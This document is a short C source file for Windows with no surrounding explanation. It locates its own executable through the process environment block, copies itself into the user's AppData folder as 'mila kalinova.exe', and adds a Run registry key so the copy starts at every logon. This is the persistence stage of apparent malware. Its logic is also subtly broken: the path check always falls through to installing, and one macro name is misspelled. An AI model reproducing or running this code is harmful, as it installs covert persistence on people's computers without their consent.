#include <windows.h>

#define DECLSPEC_NAKED __declspec(naked)

#ifdef _DEBUG
typedef INT (CDECL * _vsnprintf_t)(PVOID, SIZE_T, PSTR, ...);

static _vsnprintf_t VsnprintfProc;
static HANDLE DebugConsoleHandle;
static CHAR DebugConsoleBuffer[0x1000];

VOID DebugInit(VOID) {
  DebugConsoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
  VsnprintfProc = (PVOID)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "_vsnprintf");
}

VOID DebugPrint(IN PCSTR szFormat, IN ...) {
  SIZE_T cbBuffer;
  
  if ((cbBuffer = VsnprintfProc(DebugConsoleBuffer, ARRAYSIZE(DebugConsoleBuffer), szFormat, (va_list)((PULONG_PTR)&szFormat + 1)))) {
    ULONG dwIo;

    WriteFile(DebugConsoleHandle, DebugConsoleBuffer, (ULONG)cbBuffer, &dwIo, NULL);
  }
}
#else
  #define DebugInt()      __noop()
  #define DebugPrint(...) __noop(__VA_ARGS__)
#endif

#ifdef _DEBUG
  INT wmain() {
#else
  INT wWinMain() {
#endif
  PWSTR  szFullDllName;
  PWSTR  szOutputPath;
  HANDLE hProcessHeap;

  #ifdef _DEBUG
    DebugInit();
  #endif

  __asm {
    push ebx
    mov ebx, fs:[0x18]
    mov ebx, [ebx + 0x30]
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x28]

    mov [szFullDllName], ebx
    pop ebx
  };

  hProcessHeap = GetProcessHeap();

  if (!(szOutputPath = HeapAlloc(hProcessHeap, 0, MAX_PATH * sizeof(WCHAR)))) {
    return ERROR_SUCCESS;
  }

  BOOL bStage2 = FALSE;
  WCHAR szFilePart[] = L"\\mila kalinova.exe";
  ULONG dwOutputPathLenght = GetEnvironmentVariableW(L"APPDATA", szOutputPath, MAX_PATH);

  for (ULONG_PTR i = 0; i != ARRAYSIZE(szFilePart); i++) {
    szOutputPath[dwOutputPathLenght + i] = szFilePart[i];
  }

  for (ULONG_PTR i = 0; i != dwOutputPathLenght; i++) {
    if (szFullDllName[i] != szOutputPath[i]) {
      goto LINSTALL;
    }
  }

LINSTALL:
  dwOutputPathLenght += ARRAYSIZE(szFilePart);

  DebugPrint("installing %ls, %ls\n", szFullDllName, szOutputPath);

  CopyFileW(szFullDllName, szOutputPath, FALSE);
   
  RegSetKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"mila kalinova", REG_SZ, szOutputPath, (dwOutputPathLenght + 1) * sizeof(WCHAR));
}
